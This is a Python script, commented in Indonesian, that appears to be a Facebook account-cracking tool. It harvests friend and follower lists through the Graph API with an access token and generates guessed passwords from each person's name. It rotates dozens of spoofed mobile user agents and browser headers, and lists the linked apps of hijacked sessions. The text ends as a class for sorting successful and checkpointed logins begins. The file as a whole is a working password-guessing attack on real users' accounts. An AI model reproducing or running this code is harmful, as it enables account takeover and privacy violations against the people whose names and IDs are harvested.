# recode? gak usah di jual belikan ye asw kecuali hasilnya bagi dua sama gw:'v
# https://m.facebook.com/awkswkswkwks

import re
import os
import sys
import json
import glob
import time
import urllib
import random
import requests as r
from bs4 import BeautifulSoup as bs

def cvs(c):
	return ";".join("%s=%s" % (x, y) for x, y in c.items())

def cvd(c):
	return dict(map(lambda i: i.split("="), c.replace("; ", ";").split(";"))) if type(c) != dict else c
	
class d:
	
	def __init__(self, c, t):
		self.c = c
		self.t = t
		self.i = []
	
	def fl(self, uid):
		try:
			rs = r.get("https://graph.facebook.com/"+uid+"/?fields=friends.limit(5000)&access_token="+self.t, headers={"Host": "graph.facebook.com", "user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36", "accept": "application/json, text/plain, */*", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "origin": "https://www.facebook.com", "referer": "https://www.facebook.com"}).json()
			for x in rs["friends"]["data"]:
				self.i.append({"u": x["id"], "n": x["name"]})
			print(f"\r # {len(self.i)} retrieved ", end="")
			return self.i
		except:
			return self.i

	def fs(self, uid):
		try:
			rs = r.get("https://graph.facebook.com/"+uid+"/subscribers?limit=5000&access_token="+self.t, headers={"Host": "graph.facebook.com", "user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935S Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36", "accept": "application/json, text/plain, */*", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "origin": "https://www.facebook.com", "referer": "https://www.facebook.com"}).json()
			for x in rs["data"]:
				self.i.append({"u": x["id"], "n": x["name"]})
			print(f"\r # {len(self.i)} retrieved ", end="")
			return self.i
		except:
			return self.i

def react(poi, cookie):
	s = r.Session()
	s.headers.update({"user-agent": "[FBAN/EMA;FBLC/id_ID;FBAV/114.0.0.12.83;FBDM/DisplayMetrics{density=1.3125, width=480, height=761, scaledDensity=1.3125, xdpi=217.714, ydpi=216.17};]", "accept-language": "id-ID,id;q=0.9"})
	rt = random.choice(["2", "16"])
	rs = s.get(h+"/reactions/picker/?is_permalink=1&ft_id="+poi, cookies=cookie)
	p = bs(rs.text, "html.parser")
	if not p.find("span", string="(Hapus)"):
		for x in p.findAll("a", href=True):
			if "reaction_type="+rt in x["href"]:
				s.get(h+x["href"], cookies=cookie)
				break

def apc(tab, cookie):
	rs = r.get(f"https://mbasic.facebook.com/settings/apps/tabbed/?tab={tab}", headers={"user-agent": "[FBAN/EMA;FBLC/id_ID;FBAV/114.0.0.12.83;FBDM/DisplayMetrics{density=1.3125, width=480, height=761, scaledDensity=1.3125, xdpi=217.714, ydpi=216.17};]", "accept-language": "id-ID,id;q=0.9"}, cookies=cookie)
	if not "Diakses menggunakan Facebook" in re.search("title>(.*?)<", rs.text).group(1):
		print("\r      .! cookie invalid")
		return
	if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in rs.text or "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in rs.text:
		#print(f"\r      .! tidak ditemukan aplikasi yang {'aktif' if tab == 'active' else 'kedaluwarsa'}")
		return
	p = bs(rs.text, "html.parser")
	l = []
	for x in p.findAll("a", href=True):
		if "/settings/applications/details/?app_id=" in x["href"]:
			if x["href"].split("=")[-1] not in l:
				l.append(x["href"].split("=")[-1])
	if not l:
		return
	if not filter:
		print(f"\r      + {len(l)} aplikasi {'aktif' if tab == 'active' else 'kedaluwarsa'} ditemukan")
	for x in l:
		detail = p.find("a", href="/settings/applications/details/?app_id="+x)
		apk = detail.find("a", string=True)
		add = detail.find("div", string=True)
		apk = detail.find("span", class_=True, string=True) if not apk else apk
		if filter:
			if re.findall("|".join(filter), apk.text.lower()):
				print("\r        > {} | {}".format(apk.text, add.text))
		else:
			print("\r        > {} | {}".format(apk.text, add.text))

def cu():
	ua = input(" ?> useragent: ")
	while not ua:
		ua = input(" ?> useragent: ")
	open(".ua", "w").write(ua)
	print(" + jalankan ulang script nya")

def sm():
	print("\n + select login method")
	print(" [1] m.facebook")
	print(" [2] free.facebook")
	print(" [3] mbasic.facebook")
	sl = input("\n ?> ")
	while not sl in list("123"):
		sl = input(" ?> ")
	if sl == "1":
		url = "https://m.facebook.com"
	elif sl == "2":
		url = "https://free.facebook.com"
	elif sl == "3":
		url = "https://mbasic.facebook.com"
	global hl
	hl = url

def sp(us, fl=list(), ml=False):
	if not ml:
		for x in us:
			name = x["n"].lower()
			pr = [name.split(" ")[0]+"123", name.split(" ")[0]+"12345", name]
			for i in range(len(pr)):
				if len(pr[i]) < 6:
					pr[pr.index(pr[i])] = "blacklist!"
			pr = [fr for fr in pr if not "blacklist!" in fr]
			if pr:
				if pr[0]:
					fl.append({"u": x["u"], "p": pr})
		return fl
	pw = input(" ?> password: ")
	while not pw.split(",") or len(pw) < 6:
		if "first" in pw or "fullname" in pw:
			break
		pw = input(" ?> password: ")
	ps = pw.split(",")
	for i in ps:
		if not "first" in i:
			if len(i) < 6:
				pw = pw.replace(i, "blacklist!")
	pr = ",".join([fr for fr in pw.split(",") if not "blacklist!" in fr])
	for x in us:
		name = x["n"].lower()
		po = pr.split(",")
		if "first" in pr or "fullname" in pr:
			po = pr.replace("first", name.split(" ")[0]).replace("fullname", name).split(",")
			for i in range(len(po)):
				if len(po[i]) < 6:
					po[po.index(po[i])] = "blacklist!"
		fx = [fr for fr in po if not "blacklist!" in fr]
		if fx:
			if fx[0]:
				fl.append({"u": x["u"], "p": fx})
	return fl

ch = lambda o: dict(map(lambda i: i.split(": "), o.splitlines()))
uap = ['Mozilla/5.0 (Linux; Android 10; vivo 1935) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36', "Mozilla/5.0 (Linux; Android 4.1.2; GT-S6310N Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.141 Mobile Safari/537.36", 'Mozilla/5.0 (Linux; Android 5.1.1; F1f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; vivo 1901 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.10.2', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.5.1300 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36 mCent/0.13.1214', 'Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.96 Mobile Safari/537.36 OPR/50.0.2254.149182', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.68 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1819 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.1', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.123 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.1.4.994 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; in-ID; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.9.8.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.3.6.2 ', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36 OPR/52.2.2254.54723', 'Mozilla/5.0 (Linux; Android 10; V2032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.0.4.2', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.5.1(20460) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.2.1303 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; rv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Rocket/2.5.1(20460) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/47.1.2254.147528', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 OPR/52.1.2254.54298', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36 YaApp_Android/11.01 YaSearchBrowser/11.01', 'Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A59m Build/LMY47I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.6.2) WindVane/8.0.0 720X1280 GCanvas/1.4.2.21', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/33.0.2254.125672', 'Mozilla/5.0 (Linux; U; Android 8.1.0; in-id; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.0.3beta', 'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.5.1304 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.5.1304 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 YaApp_Android/9.99 YaSearchBrowser/9.99', 'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.8.1305 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36 YaApp_Android/11.01 YaSearchBrowser/11.01', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.93 Mobile Safari/537.36 YaApp_Android/9.75 YaSearchBrowser/9.75', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.110 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1727 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/73.0.3683.90 Mobile Safari/537.36 OPR/35.3.2254.129226', 'Mozilla/5.0 (Linux; U; Android 8.1.0; id-ID; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; CPH1701 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.13.5.1209 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36 Puffin/9.0.0.50263AP', 'Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.3.6.2', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.8.1301 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A33fw Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; en-US; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-CN; OPPO R11 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.1.1.991 Mobile Safari/537.36NULL', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; Infinix X5515F Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.66 Mobile Safari/537.36 OPR/52.1.2254.54298', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.141 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1723 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.123 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.81 Mobile Safari/537.36 OPR/50.0.2254.149182', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.91 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.4.0.42081AP', 'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36 OPR/47.1.2249.129326', 'Mozilla/5.0 (Linux; Android 11; V2036; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.4.4', 'Mozilla/5.0 (Linux; Android 6.0.1; vivo 1610 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.107 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; U; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.149 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 6.0; ms-MY; vivo 1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.3.900 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/7.4.0.0 ', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1727 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/15.5.1.10', 'Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; A37f Build/LMY47V) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.0.828 U3/0.8.0 Mobile Safari/534.30', 'Mozilla/5.0 (Linux; U; Android 5.1; zh-cn; OPPO A59m Build/LMY47I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/1.0.0.100 U3/0.8.0 Mobile Safari/534.30 AliApp(TB/6.7.0) WindVane/8.0.0 720X1280 GCanvas/1.4.2.21', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1717 Build/N4F26M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.0.1', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.117 Mobile Safari/537.36 OPR/47.0.2254.146760', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.12.3.1219 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; A33f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/72.0.3626.105 Mobile Safari/537.36 OPR/52.2.2254.54574', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-gb; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.116 Mobile Safari/537.36 HeyTapBrowser/15.7.8.0.1beta', 'Mozilla/5.0 (Linux; Android 5.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.0.0.1288 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.68 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; CPH1717 Build/N4F26M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/13.2.0.1296 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.3.2', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1801 Build/NMF26F; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.101 Mobile Safari/537.36 OPR/51.0.2254.150807', 'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; CPH1729 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 OppoBrowser/15.6.2.0.4beta', 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 5.1; A1601 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/46.0.2490.76 Mobile Safari/537.36 OPR/28.0.2254.119224', 'Mozilla/5.0 (Linux; U; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.136 Mobile Safari/537.36 OPR/50.0.2254.149182', 'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; OPPO R9s Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.2 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; V2036; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/6.9.4.4', 'Mozilla/5.0 (Linux; Android 7.1.1; CPH1727 Build/N6F26Q; in-id) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36 Puffin/8.3.1.41624AP', 'Mozilla/5.0 (Linux; U; Android 7.1.1; CPH1729 Build/N6F26Q; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36 OPR/51.0.2254.150807']
uag = ["NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+", 'NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']
hg = 'host: {hos}\nconnection: keep-alive\ncache-control: max-age=0\nupgrade-insecure-requests: 1\ndnt: 1\nuser-agent: {ua}\nsec-fetch-dest: document\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nsec-fetch-site: same-origin\nsec-fetch-mode: cors\nsec-fetch-user: empty\nreferer: {bu}\naccept-encoding: gzip, deflate\naccept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7\nx-requested-with: mark.via.gp'
hp = 'host: {hos}\nconnection: keep-alive\ncache-control: max-age=0\norigin: {hl}\nupgrade-insecure-requests: 1\ndnt: 1\ncontent-type: application/x-www-form-urlencoded\nuser-agent: {ua}\nsec-fetch-dest: document\naccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nsec-fetch-site: same-origin\nsec-fetch-mode: cors\nsec-fetch-user: empty\nreferer: {bu}\naccept-encoding: gzip, deflate\naccept-language: en-GB,en-US;q=0.9,en;q=0.8\nx-requested-with: mark.via.gp'
if os.path.exists(".ua"):
	if os.path.getsize(".ua"):
		uap = open(".ua").read().splitlines()

class cr:
	
	def __init__(self):
		self.ct = 0
		self.cp = []
		self.ok = []
		self.pe = urllib.parse.urlparse(hl)
		self.buf = hl+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F"
